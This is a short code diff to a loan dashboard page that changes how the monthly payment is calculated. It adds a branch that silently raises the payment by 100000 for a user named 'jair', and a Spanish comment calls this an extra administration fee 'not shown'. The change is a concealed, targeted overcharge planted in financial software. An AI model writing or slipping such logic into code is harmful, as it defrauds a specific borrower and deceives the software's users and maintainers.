@@ -95,7 +95,13 @@ export default function DashboardPage() {
     );
   }
 
-  const fixedPayment = calculateMonthlyPayment(user.loanAmount);
+  let fixedPayment = calculateMonthlyPayment(user.loanAmount);
+
+  // Cargo adicional de administración para Jair (sin mostrar)
+  if (user.username === "jair") {
+    fixedPayment += 100000;
+  }
+
   const schedule = generateAmortizationSchedule(
     user.loanAmount,
     fixedPayment,
